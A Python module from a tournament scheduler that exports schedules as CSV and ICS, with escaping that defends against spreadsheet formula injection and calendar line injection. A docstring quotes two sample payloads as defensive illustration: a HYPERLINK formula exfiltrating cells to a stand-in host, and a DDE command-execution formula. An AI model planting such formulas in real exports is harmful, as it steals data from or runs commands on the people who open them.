"""Render the current state as CSV (order of play) or ICS (calendar feed).

CSV columns: ``event_id, round, match_id, court, slot, start_time,
duration_minutes, side_a, side_b, status``.

ICS: RFC-5545 VCALENDAR with one VEVENT per assigned PlayUnit. Times
are emitted as UTC (the prototype treats ``start_time`` as UTC at the
boundary).

**Both formats carry participant names, which are attacker-controllable**
(any operator-role member types them, and they arrive from roster import
too). Neither format escapes anything by itself, and neither is rendered
by a browser — so React's escaping, which protects every in-app surface,
protects nothing here. That makes this module a derived-output boundary
and the encoding below load-bearing (SP-SEC-1 Phase 2, SEC-05/SEC-08):

- CSV: ``csv.writer`` quotes correctly, so the file *structure* is safe,
  but Excel and LibreOffice evaluate a cell beginning ``=``/``+``/``-``/
  ``@``/TAB/CR as a formula. ``_csv_safe`` neutralizes that.
- ICS: property values are CRLF-delimited, so any CR or LF inside a value
  ends the line early and lets the rest inject arbitrary properties or a
  whole extra VEVENT into a subscriber's calendar.
"""
from __future__ import annotations

import csv
import io
from datetime import datetime, timedelta, timezone
from typing import Any, Optional

from scheduler_core.domain.tournament import TournamentState

# Leading characters that make a spreadsheet treat a cell as a formula.
# TAB and CR are included because Excel strips them and then re-reads the
# first surviving character, so a space- or tab-prefixed formula
# reaches the same place as "=cmd".
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def to_csv(
    state: TournamentState,
    *,
    interval_minutes: int,
    start_time: Optional[datetime] = None,
) -> str:
    """Return an order-of-play CSV body. Unassigned PlayUnits are skipped.

    PR 2 of the backend-merge arc dropped this function's dependency on
    the tournament product's ``TournamentSlot`` — both the tournament
    backend and the scheduler backend now pass the engine state +
    interval explicitly so the helper has no per-product coupling.
    """
    interval = interval_minutes

    out = io.StringIO()
    writer = csv.writer(out)
    writer.writerow([
        "event_id", "round", "match_id", "court", "slot",
        "start_time", "duration_minutes", "side_a", "side_b", "status",
    ])

    for pu_id, a in _ordered_assignments(state):
        pu = state.play_units[pu_id]
        side_a = _side_label(pu.side_a, state)
        side_b = _side_label(pu.side_b, state)
        round_index = int(pu.metadata.get("round", 0)) if pu.metadata else 0
        # Every cell goes through _csv_safe, not just the two that carry
        # participant names today. The ids are engine-authored now, but
        # "which of these columns is user-controlled?" is exactly the
        # question that goes stale when a column is added later.
        writer.writerow([
            _csv_safe(v)
            for v in (
                pu.event_id,
                round_index,
                pu.id,
                a.court_id,
                a.slot_id,
                _format_time(start_time, a.slot_id, interval),
                a.duration_slots * interval,
                side_a,
                side_b,
                _bucket(pu_id, a, state),
            )
        ])

    return out.getvalue()


def to_ics(
    state: TournamentState,
    *,
    interval_minutes: int,
    start_time: Optional[datetime] = None,
) -> str:
    """Return an RFC-5545 VCALENDAR feed."""
    interval = interval_minutes
    start_time = start_time or datetime.now(timezone.utc)
    stamp = _ics_dt(datetime.now(timezone.utc))

    lines = [
        "BEGIN:VCALENDAR",
        "VERSION:2.0",
        "PRODID:-//tournament-prototype//EN",
        "CALSCALE:GREGORIAN",
    ]
    for pu_id, a in _ordered_assignments(state):
        pu = state.play_units[pu_id]
        event_start = _slot_to_dt(start_time, a.slot_id, interval)
        event_end = _slot_to_dt(
            start_time, a.slot_id + a.duration_slots, interval
        )
        round_index = int(pu.metadata.get("round", 0)) if pu.metadata else 0
        side_a = _side_label(pu.side_a, state) or "TBD"
        side_b = _side_label(pu.side_b, state) or "TBD"
        summary = f"{pu.event_id} R{round_index}: {side_a} vs {side_b}"
        status = (
            "CONFIRMED" if pu_id in state.results else "TENTATIVE"
        )
        # UID is escaped too. It is engine-authored today, so this is
        # belt-and-braces rather than a live fix — but an unescaped
        # interpolation into a property line is the whole bug class, and
        # leaving one site out is how it comes back.
        lines.extend([
            "BEGIN:VEVENT",
            f"UID:{_ics_escape(pu_id)}@tournament-prototype",
            f"DTSTAMP:{stamp}",
            f"DTSTART:{_ics_dt(event_start)}",
            f"DTEND:{_ics_dt(event_end)}",
            f"SUMMARY:{_ics_escape(summary)}",
            f"LOCATION:Court {a.court_id}",
            f"STATUS:{status}",
            "END:VEVENT",
        ])
    lines.append("END:VCALENDAR")
    return "\r\n".join(lines) + "\r\n"


# ---- helpers --------------------------------------------------------------


def _ordered_assignments(state: TournamentState):
    """Yield (pu_id, assignment) in (slot, court) order."""
    pairs = list(state.assignments.items())
    pairs.sort(key=lambda kv: (kv[1].slot_id, kv[1].court_id))
    return pairs


def _format_time(
    base: Optional[datetime], slot: int, interval_minutes: int
) -> str:
    if base is None:
        return f"+{slot * interval_minutes}m"
    return _slot_to_dt(base, slot, interval_minutes).isoformat()


def _slot_to_dt(base: datetime, slot: int, interval_minutes: int) -> datetime:
    return base + timedelta(minutes=slot * interval_minutes)


def _ics_dt(dt: datetime) -> str:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    else:
        dt = dt.astimezone(timezone.utc)
    return dt.strftime("%Y%m%dT%H%M%SZ")


def _csv_safe(value: Any) -> Any:
    """Neutralize spreadsheet formula injection in a cell value.

    A participant named ``=HYPERLINK("https://evil.test/?"&A1,"Results")``
    exfiltrates neighbouring cells the moment a director opens the export;
    ``=cmd|'/c calc'!A0`` is the DDE variant. Prefixing an apostrophe is
    the standard neutralizer: Excel and LibreOffice both read the cell as
    literal text and display it without the quote.

    Non-string values (the ints and floats this writer also emits) pass
    through untouched — they cannot begin with a formula character, and
    stringifying them here would change the file for no reason.
    """
    if isinstance(value, str) and value.startswith(_FORMULA_LEAD):
        return "'" + value
    return value


def _ics_escape(text: str) -> str:
    """Escape a value for an RFC-5545 property.

    The carriage return is the one that matters and the one that was
    missing: ICS lines are CRLF-delimited, so a bare CR inside a name
    terminates the ``SUMMARY:`` line at that point, and everything after
    it is parsed as a new property — enough to inject a whole VEVENT into
    a subscriber's calendar. CRLF is handled before the lone CR so a pair
    does not become two escaped newlines.
    """
    return (
        text.replace("\\", "\\\\")
        .replace(",", "\\,")
        .replace(";", "\\;")
        .replace("\r\n", "\\n")
        .replace("\r", "\\n")
        .replace("\n", "\\n")
    )


def _side_label(
    side_ids: Optional[list], state: TournamentState
) -> str:
    if not side_ids:
        return ""
    names = []
    for pid in side_ids:
        p = state.participants.get(pid)
        if p is not None and p.name:
            names.append(p.name)
        else:
            names.append(pid)
    return " / ".join(names)


def _bucket(pu_id: str, a, state: TournamentState) -> str:
    if pu_id in state.results:
        return "done"
    if a.actual_start_slot is not None and pu_id not in state.results:
        return "live"
    return "ready"
